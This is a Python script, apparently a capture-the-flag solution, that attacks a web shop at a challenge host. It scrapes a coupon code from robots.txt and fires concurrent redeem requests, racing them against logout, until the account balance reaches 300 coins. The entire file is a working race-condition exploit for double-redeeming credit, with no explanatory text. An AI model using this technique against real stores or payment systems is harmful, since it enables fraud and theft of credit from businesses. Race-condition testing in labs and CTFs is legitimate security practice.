import requests
import re
import threading
import time
from multiprocessing import *
import json

TARGET_URL = 'http://gc1.eng.run:30559'

s = requests.Session()
code = ''

def register(us,pw):
    try:
        data = {
            "name":us,
            "password":pw
        }

        res = requests.post(f"{TARGET_URL}/register",data=data)
        print(res.text)
    except:
        print("error registering")

def login(us,pw):
    try:
        data = {
            "name":us,
            "password":pw
        }

        res = s.post(f"{TARGET_URL}/login",data=data)
        print(res.text)
    except:
        print('error logging in')

def getGiftCode():
    res = s.get(f'{TARGET_URL}/robots.txt')
    codegift = re.findall('coupon code : (.*)',res.text)
    return codegift[0]


def redeem():
    try:
        data = {
            "code":code
        }
        res = s.post(f"{TARGET_URL}/transfer",data=data)
        print(res.text)
    except:
        print('error redeeming')

def raceRedeem():
    t=[]
    t.append(threading.Thread(target=redeem))
    t.append(threading.Thread(target=logout))
    for i in range(0,2):
        t[i].start()

    for i in range(0,2):
        t[i].join()

def logout():
    res=s.get(f"{TARGET_URL}/logout")
    print('logout')
    #print(res.text)

def delete():
    res=s.post(f"{TARGET_URL}/delete")
    #print(res.text)

def add(pid):
    data = {
        "pid":pid
    }
    res=s.post(f"{TARGET_URL}/add",data=data)
    print(res.text)

def buy(pid):
    data = {
        "pid":pid
    }
    res=s.post(f"{TARGET_URL}/buy",data=data)
    print(res.text)

def raceBuy():
    try:
        p=[]
        for i in range(2):
            p.append(Process(target=redeem))
        for i in range(2):
            p[i].start()
        time.sleep(2)  
    except:
        print("error racing")
     
def coins():
    res = s.get(f"{TARGET_URL}/api/user")
    return res.json()[0]['coins']

def renew(us,pw):
    try:
        register(us,pw)
        login(us,pw)
        delete()
    except:
        print("error")

def startRace():
    try:
        delete()
        register('navy','test')
        login('navy','test')
        raceBuy()
        if(coins()<300):
            return False
        return True
    except:
        print('error')

renew('navy','test')
code = getGiftCode()
while True:
    startRace()
    if(coins()>=300):
        break
    print(coins())
print(coins())